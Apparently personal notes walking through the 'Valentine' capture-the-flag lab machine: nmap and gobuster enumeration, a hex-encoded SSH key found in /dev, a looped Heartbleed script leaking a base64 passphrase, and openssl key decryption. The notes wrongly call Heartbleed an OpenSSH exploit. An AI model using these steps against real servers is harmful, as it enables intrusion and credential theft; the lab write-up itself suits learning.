###############
Valentine
OPEN SSH HeartBleed exploit
https://gist.github.com/eelsivart/10174134
###############

1-Enummeration:
    └─$ nmap -T5 -sV -sC -Pn 10.129.125.4 -v
        PORT      STATE    SERVICE         VERSION
        4/tcp     filtered unknown
        22/tcp    open     ssh             OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
        |   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
        |_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
        80/tcp    open     http            Apache httpd 2.2.22 ((Ubuntu))
        |_http-server-header: Apache/2.2.22 (Ubuntu)
        |_http-title: Site doesn't have a title (text/html).
        | http-methods: 
        |_  Supported Methods: GET HEAD POST OPTIONS
        106/tcp   filtered pop3pw
        427/tcp   filtered svrloc
        443/tcp   open     ssl/http        Apache httpd 2.2.22 ((Ubuntu))
        |_http-server-header: Apache/2.2.22 (Ubuntu)
        |_http-title: Site doesn't have a title (text/html).
        | http-methods: 
        |_  Supported Methods: GET HEAD POST OPTIONS
        |_ssl-date: 2024-06-06T15:51:12+00:00; 0s from scanner time.
        | ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
        | Issuer: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
        | Public Key type: rsa
        | Public Key bits: 2048
        | Signature Algorithm: sha1WithRSAEncryption
        | Not valid before: 2018-02-06T00:45:25
        | Not valid after:  2019-02-06T00:45:25
        | MD5:   a413:c4f0:b145:2154:fb54:b2de:c7a9:809d
        |_SHA-1: 2303:80da:60e7:bde7:2ba6:76dd:5214:3c3c:6f53:01b1


    Port 80:
        └─$ gobuster dir -u http://10.129.125.4/ -r -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
            /dev 
        We found an hexadecimale encode
            http://10.129.125.4/dev/hype_key

        # We decode the hexadecimal into text:
            WE find private RSA KEY for SSH CONNECTION

    Port 443:
        # If needed:
            Bypass SSL Certificate
            └─$ gobuster dir -u http://10.129.125.4/ -r -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -k
          


    Exploit the private rsa_key for SSH:
        private key mode:
        chmod 600 id_rsa

        # We will crack the password:
        python sshjohn.py id_rsa > id_rsa.hash
        john --wordlist=rockyou.txt id_rsa.hash

        Nothing to crackSS

        # Connecting in ssh via private rsa at this STAGE of this exploit, it doesn't work:
            If no public key, but private only:
                ssh -i id_rsa  adminuser@10.129.125.4

                ssh adminuser@10.129.125.4


    Open SSH 5.9 - exxploit Heartbleed:
        https://gist.github.com/eelsivart/10174134

        python2 heartbleed.py -a heartBleed.txt -n 1000 10.129.125.4 

        The way this script works is that it is returning a maximum of 4000 bytes of memory directly adjacent to the SSL request. 
        The problem is, that part of the memory doesn’t always hold useful information. If I run the script a few more times consecutively, hopefully there will be some interesting data within bytes returned.
       
        -n parameter is used to loop the request to the server we choose 1000 Interations.
        -a parameter to output to a file, so I can let it run and parse it later.

        # The results, reveal a base64 encoded string assigned to a $text variable. 
            $text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.B

        # We use the decode.php provided by the website to decode the bas64 string:
            We found the secret key:
                heartbleedbelievethehype
        
        # We use the secret to decrypt the private key obtained earlier. 
            └─$ sudo openssl rsa -in hype_key -out hype_key_decrypted.key


        In case We receive this message:
            "bad permisssion for key and Permission denied."

        We try  way to bypass:
          
            # So, I change the permission for hype_key and login again.(success to login)

                chmod 400 hype_key

            Change permission for key and login again
            
            
            Second method
            Using openssl to regenerate another key to login.
            Generating a new ssh RSA key by private key from /dev/hype_key and password.

                openssl rsa -in hype_key -out new.key